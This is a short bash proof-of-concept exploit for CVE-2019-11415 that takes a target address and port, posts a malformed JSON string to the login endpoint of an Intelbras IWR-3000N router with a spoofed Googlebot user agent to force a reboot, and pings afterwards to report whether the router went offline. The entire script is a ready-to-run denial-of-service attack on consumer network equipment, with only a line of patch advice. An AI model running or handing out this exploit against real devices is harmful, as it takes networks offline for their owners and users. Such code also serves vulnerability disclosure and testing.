#/bin/bash

#   PoC based on CVE-2019-11415 created by Social Engineering Neo.
#
#   Credit: https://1.337.zone/2019/04/08/intelbras-iwr-3000n-any-version-dos-on-malformed-login-request/
#
#   A malformed login request allows remote attackers to cause a denial of service (reboot), as demonstrated by JSON misparsing of the \""} string to v1/system/login.
#
#   Upgrade to latest firmware version iwr-3000n-1.8.7_0 for 3000n routers to prevent this issue.

clear
read -p "Enter Target Address Followed by Port: " target port   # localhost 8080

alive=$(ping -c 1 $target | grep icmp* | wc -l)
if [ "$alive" -eq 0 ]; then
    echo Target May be Offline or Blocking ICMP requests.
    read -p "Would you Like to Proceed? (Y/n): " ans
    if [ "$ans" = 'n' ] || [ "$ans" = 'N' ]; then
        clear
        exit
    fi
fi

if [ "$port" -lt 65536 ] && [ "$port" -gt 0 ]; then
    grab=$(curl -s -A 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)' --compressed --data-binary '\""}' $target:$port/v1/system/login)
else
    echo "Incorrect Port."
fi

clear
alive=$(ping -c 1 $target | grep icmp* | wc -l)
if [ "$alive" -eq 0 ]; then
    echo Router Successfully Taken Offline.     #NOTE: if router blocks ICMP requests this may be inaccurate.
else
    echo Exploit Unsuccessfull, Target May Not be Vulnerable.
fi